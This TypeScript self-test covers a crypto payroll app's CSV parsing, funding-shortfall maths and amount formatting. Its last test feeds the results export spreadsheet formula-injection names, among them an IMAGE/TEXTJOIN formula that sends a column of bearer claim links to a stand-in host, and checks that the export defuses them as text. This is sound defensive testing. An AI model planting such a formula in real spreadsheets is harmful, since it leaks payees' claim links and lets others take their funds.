/**
 * Self-test: a payroll list is read the way it was written, and the money the
 * page tells you to add really covers the run.
 *
 * Review, 24 Oct 2026:
 *   - every line used to split on commas, tabs and semicolons at once, so a
 *     semicolon or tab list's "1,25" or "1,250" became two cells and the row
 *     quietly paid 1. One delimiter per list now, a shifted row is refused,
 *     and a quote that never closes is a row error.
 *   - "add X as one deposit" could be too little: the new note joins the same
 *     smallest-first order and can be spent on an earlier row. The suggestion
 *     is now checked against that order (an independent model of it here).
 *   - the shortfall, the run total and the invoice rounded to two decimals
 *     (0.004 showed as 0.00, Number lost units on big amounts); they are exact.
 *
 * Security review, 25 Oct 2026: the results file put a payee's name, as typed
 * in the list, in a cell a spreadsheet runs as a formula (=, +, -, @), next to
 * the unclaimed rows' claim links, which are bearer codes. Such a cell now
 * starts with an apostrophe, so it reads as text; the links stay as they are.
 *
 * Run from app/:  ../mcp/node_modules/.bin/tsx scripts/selftest-payroll-csv.mts
 */
import assert from "node:assert/strict";
import "./browser-shim.mjs";
import { parseUnits, type Address } from "viem";

const { parsePayrollCsv, fundingPlan, PAYROLL_TEMPLATE, exportResultsCsv, claimLink } = await import("../src/lib/payroll");
const { assetDecimals, formatAssetAmountExact } = await import("../src/lib/shield");

let passed = 0;
function test(name: string, fn: () => void) {
  fn();
  passed++;
  console.log(`ok  ${name}`);
}

const ASSET = "0x00000000000000000000000000000000000000ee" as Address;
const NATIVE = "0x0000000000000000000000000000000000000000";
const units = (s: string) => parseUnits(s, assetDecimals(ASSET));
const one = (csv: string) => {
  const { rows, error } = parsePayrollCsv(csv, ASSET);
  assert.equal(error, null, csv);
  assert.equal(rows.length, 1, csv);
  return rows[0];
};

// ------------------------------------------------------------------ CSV

test("a semicolon list's decimal comma is refused, never paid as 1", () => {
  const r = one("name;gloam_address;amount\nAda;;1,25");
  assert.equal(r.amount, null);
  assert.match(r.error ?? "", /dot for decimals/);
});

test("a tab list keeps 1,250 whole (1250, not 1)", () => {
  assert.equal(one("name\tamount\nAda\t1,250").amount, units("1250"));
  assert.equal(one("name\tgloam_address\tamount\nAda\t\t12,500.75").amount, units("12500.75"));
});

test("a tab list's empty first cells stay in their columns", () => {
  const r = one("name\tgloam_address\tamount\n\t\t1.25");
  assert.equal(r.error, null);
  assert.equal(r.amount, units("1.25"));
  assert.equal(r.name, "Person 1");
});

test("a comma list keeps a semicolon inside its note", () => {
  const r = one("name,gloam_address,amount,note\nAda,,10,salary; bonus");
  assert.equal(r.note, "salary; bonus");
  assert.equal(r.amount, units("10"));
});

test("a semicolon list keeps a comma inside its note", () => {
  const r = one("name;amount;note\nAda;1.25;salary, bonus");
  assert.equal(r.note, "salary, bonus");
  assert.equal(r.amount, units("1.25"));
});

test("a quoted 1,250 in a comma list is one cell", () => {
  assert.equal(one('name,amount,note\nAda,"1,250","Sept, final"').amount, units("1250"));
  assert.equal(one('name,amount\n"Obi, Ada",980').name, "Obi, Ada");
});

test("an unquoted decimal comma in a comma list is refused, not paid as 1", () => {
  const r = one("name,amount\nAda,1,25");
  assert.equal(r.amount, null);
  assert.match(r.error ?? "", /more cells than the list has columns/);
  // without a header, a row wider than the first one is refused the same way
  const { rows } = parsePayrollCsv("Ada,,10\nTunde,,1,25", ASSET);
  assert.equal(rows[0].error, null);
  assert.equal(rows[1].amount, null);
  assert.match(rows[1].error ?? "", /more cells/);
});

test("a quote that never closes, or text after one, is a row error", () => {
  for (const csv of ['name,amount\nAda,"1.25', 'name,amount\nAda,"1"25', 'name,amount\n"Ada"x,10']) {
    const r = one(csv);
    assert.equal(r.amount, null, csv);
    assert.match(r.error ?? "", /quotes/, csv);
  }
  // a quote inside a plain cell is just a character
  assert.equal(one('name,amount\nAda "Ace" Obi,10').name, 'Ada "Ace" Obi');
});

test("the template and plain lists read as before", () => {
  const { rows, error } = parsePayrollCsv(PAYROLL_TEMPLATE, ASSET);
  assert.equal(error, null);
  assert.equal(rows.length, 2);
  assert.match(rows[0].error ?? "", /incomplete or mistyped/); // the placeholder address
  assert.equal(rows[1].error, null);
  assert.equal(rows[1].amount, units("980"));
  assert.equal(rows[1].note, "Invoice 7");
  assert.equal(one("Ada,12.50").amount, units("12.50"));
  assert.equal(one("Ada,,12.50,Sept").note, "Sept");
  assert.equal(one('name,amount\r\nAda,"$1,250.00"\r\n').amount, units("1250"));
});

test("a spreadsheet's empty rows (,,, or tabs) are skipped, not error rows", () => {
  const { rows, error } = parsePayrollCsv("name,amount\nAda,10\n,\n , \nBo,20\n,,", ASSET);
  assert.equal(error, null);
  assert.deepEqual(rows.map((r) => [r.name, r.error]), [["Ada", null], ["Bo", null]]);
  assert.deepEqual(rows.map((r) => r.line), [2, 5], "line numbers still point at the file");
  const tabs = parsePayrollCsv("Ada\tgloamr1.x\t10\n\t\t\nBo\t\t5", ASSET).rows;
  assert.equal(tabs.length, 2);
  // a row with only an amount still reads (a claim link for "Person N")
  assert.equal(parsePayrollCsv("name,amount\n,7", ASSET).rows[0]!.amount, units("7"));
});

// ------------------------------------------------------------------ funding

/** How a run spends, written apart from lib/payroll: rows in order, each from the smallest note that covers it. */
function runCovers(amounts: bigint[], notes: bigint[]): boolean {
  const left = notes.filter((n) => n > 0n);
  for (const amt of amounts) {
    let pick = -1;
    for (let i = 0; i < left.length; i++) {
      if (left[i] >= amt && (pick < 0 || left[i] < left[pick])) pick = i;
    }
    if (pick < 0) return false;
    left[pick] -= amt;
  }
  return true;
}

test("the suggested deposit covers the run (1, 1, 2, 2 from notes 1 and 3)", () => {
  const amounts = [1n, 1n, 2n, 2n];
  const notes = [1n, 3n];
  assert.equal(runCovers(amounts, [...notes, 2n]), false, "the old suggestion, 2, leaves the last row unpaid");
  const plan = fundingPlan(amounts, notes);
  assert.equal(plan.covered, 3);
  assert.ok(runCovers(amounts, [...notes, plan.shortfall]));
  assert.equal(plan.shortfall, 3n, "and it is the smallest that does");
});

test("a run that already fits needs nothing", () => {
  assert.deepEqual(fundingPlan([5n, 3n], [10n]), { covered: 2, shortfall: 0n });
  assert.deepEqual(fundingPlan([], []), { covered: 0, shortfall: 0n });
});

test("4,000 random runs: the suggestion always covers, and nothing smaller does", () => {
  let seed = 20261024;
  const rand = (n: number) => {
    seed = (Math.imul(seed, 1103515245) + 12345) >>> 0;
    return seed % n;
  };
  for (let t = 0; t < 4000; t++) {
    const amounts = Array.from({ length: 1 + rand(14) }, () => BigInt(1 + rand(40)));
    const notes = Array.from({ length: rand(9) }, () => BigInt(rand(60)));
    const step = [1n, 1n, 5n][rand(3)];
    const plan = fundingPlan(amounts, notes, step);
    const covers = runCovers(amounts, notes);
    assert.equal(plan.shortfall === 0n, covers, `case ${t}`);
    if (covers) continue;
    assert.equal(plan.shortfall % step, 0n, `case ${t}: a whole number of steps`);
    assert.ok(runCovers(amounts, [...notes, plan.shortfall]), `case ${t}: covers`);
    assert.ok(!runCovers(amounts, [...notes, plan.shortfall - step]), `case ${t}: smallest`);
  }
});

test("a cents step rounds the deposit up to something people can type", () => {
  const cents = 10n ** BigInt(Math.max(assetDecimals(ASSET) - 2, 0));
  const plan = fundingPlan([units("1.234")], [], cents);
  assert.equal(plan.shortfall, units("1.24"));
});

// ------------------------------------------------------------------ amounts

test("exact amounts keep every unit", () => {
  assert.equal(formatAssetAmountExact(1n, NATIVE), "0.000000000000000001");
  assert.equal(formatAssetAmountExact(4n * 10n ** 15n, NATIVE, 2), "0.004");
  assert.equal(formatAssetAmountExact(10n ** 18n, NATIVE, 2), "1.00");
  assert.equal(formatAssetAmountExact(1_250_500_000_000_000_000_000n, NATIVE, 2), "1,250.50");
  assert.equal(formatAssetAmountExact("9007199254740993000000000000000001", NATIVE), "9,007,199,254,740,993.000000000000000001");
  assert.equal(formatAssetAmountExact(0n, NATIVE), "0");
});

// ------------------------------------------------------------------ results file

test("the results file never writes a name as a formula, and keeps the claim links as they are", () => {
  const names = ['=IMAGE("https://x.example/?"&TEXTJOIN(",",1,F:F))', "+1", "-1", "@SUM(A1)", "\t=1", "Ada"];
  const tickets = names.map((_, i) => `gloam1.eyJ2IjoxLCJrIjoi${i}`);
  const batch = {
    id: "b1", title: "Oct", createdAt: 0, chainId: 4663, pool: "0x39e28cde55cab798874746ac52cb4b5cc99a0194" as Address, asset: ASSET,
    employer: "0x1111111111111111111111111111111111111111" as Address, relay: true, status: "done" as const,
    rows: names.map((name, i) => ({ id: `r${i}`, name, recipient: "", kind: "link", amount: units("1"), status: "paid", ticket: tickets[i], note: i === 0 ? "=HYPERLINK(1)" : undefined })),
  };
  const out = exportResultsCsv(batch as never, { origin: "https://gloam.trade", networkKey: "robinhood-mainnet", assetLabel: "USDG", explorerTx: (h: string) => h });
  const cells = (line: string) => [...line.matchAll(/("(?:[^"]|"")*"|[^,]*)(,|$)/g)].map((m) => m[1]!.replace(/^"([\s\S]*)"$/, "$1").replace(/""/g, '"')).slice(0, -1);
  const lines = out.split("\n").slice(1);
  lines.forEach((line, i) => {
    const row = cells(line);
    const name = row[0]!;
    if (/^[=+\-@\t\r]/.test(names[i]!)) assert.equal(name, `'${names[i]}`, `row ${i}: the name reads as text`);
    else assert.equal(name, names[i]);
    assert.equal(row[5], claimLink("https://gloam.trade", "robinhood-mainnet", tickets[i]!), `row ${i}: the claim link is untouched`);
  });
  assert.ok(lines[0]!.endsWith(`"'=HYPERLINK(1)"`) || lines[0]!.endsWith(`'=HYPERLINK(1)`), "the note column too");
});

console.log(`\n${passed} payroll list checks passed`);
